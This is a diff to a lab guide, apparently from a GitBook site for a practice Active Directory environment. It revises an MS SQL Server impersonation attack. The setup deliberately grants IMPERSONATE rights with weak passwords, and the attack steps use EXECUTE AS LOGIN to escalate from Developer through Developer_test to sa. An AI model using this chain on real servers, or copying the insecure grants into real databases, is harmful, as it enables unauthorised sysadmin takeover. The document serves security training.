@@ -9,13 +9,13 @@ description: >-
 
 ## Configuring
 
-#### Prerequisite
+### Prerequisite
 
 {% content-ref url="../initial-access/normal-domain-user-access.md" %}
 [normal-domain-user-access.md](../initial-access/normal-domain-user-access.md)
 {% endcontent-ref %}
 
-#### Configuring
+### Configuring
 
 1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.
 2. Open "Microsoft SQL Server Management Studio"
@@ -24,28 +24,28 @@ description: >-
 
 3\. Login with the `Administrator` user using Windows Authentication.
 
-![](<../../../../.gitbook/assets/image (7).png>)
+![](<../../../../.gitbook/assets/image (7) (1).png>)
 
 4\. Click “New Query” button and use the SQL query below to create two new users:
 
-![](<../../../../.gitbook/assets/image (29).png>)
+![](<../../../../.gitbook/assets/image (29) (1).png>)
 
 ```
 CREATE LOGIN Developer WITH PASSWORD = 'MyPassword!';
-CREATE LOGIN DB_Owner WITH PASSWORD = 'MyPassword!';
+CREATE LOGIN Developer_test WITH PASSWORD = 'MyPassword!';
 ```
 
-![](<../../../../.gitbook/assets/image (6).png>)
+![](<../../../../.gitbook/assets/image (50).png>)
 
 5\. Rune the following Query to allow impersonation:
 
 ```
-USE Production;
 GRANT IMPERSONATE ON LOGIN::Developer to [AMSTERDAM\Richard];
-GRANT IMPERSONATE ON LOGIN::DB_Owner to [Developer];
+GRANT IMPERSONATE ON LOGIN::Developer_test to [Developer];
+GRANT IMPERSONATE ON LOGIN::sa to [Developer_test];
 ```
 
-![](<../../../../.gitbook/assets/image (19).png>)
+![](<../../../../.gitbook/assets/image (36).png>)
 
 ## Attacking
 
@@ -84,17 +84,17 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-We can impersonate the Developer user.
+We can impersonate the `Developer` user.
 
 ![](<../../../../.gitbook/assets/image (62).png>)
 
-6\. Impersonate the Developer user with the following Query:
+6\. Impersonate the `Developer` user with the following Query:
 
 ```
 EXECUTE AS LOGIN = 'developer'
 ```
 
-![](<../../../../.gitbook/assets/image (42).png>)
+![](<../../../../.gitbook/assets/image (42) (1).png>)
 
 {% hint style="info" %}
 Make sure the Master database is selected since the developer user doesn't have access to the production database.
@@ -102,15 +102,39 @@ Make sure the Master database is selected since the developer user doesn't have 
 
 7\. Execute the who can be impersonated query again:
 
-![](<../../../../.gitbook/assets/image (56).png>)
+![](<../../../../.gitbook/assets/image (52).png>)
 
-8\. Impersonate DB\_Owner:
+8\. Impersonate the user `sa`:
 
 ```
-EXECUTE AS LOGIN = 'DB_Owner'
+EXECUTE AS LOGIN = 'sa'
 ```
 
-We successfully impersonated Developer and then DB\_Owner.
+![](<../../../../.gitbook/assets/image (42).png>)
+
+Hmm that doesn't work, lets impersonate `Developer_test`
+
+8\. Impersonate `Developer_test`:
+
+```
+EXECUTE AS LOGIN = 'Developer_test'
+```
+
+9\. Execute the who can be impersonated query again:
+
+![](<../../../../.gitbook/assets/image (7).png>)
+
+10\. Impersonate `sa`:
+
+```
+EXECUTE AS LOGIN = 'sa'
+```
+
+Now no error:
+
+![](<../../../../.gitbook/assets/image (43).png>)
+
+We successfully impersonated `Developer` --> `Developer_test` --> `sa`.
 
 ## Defending
 
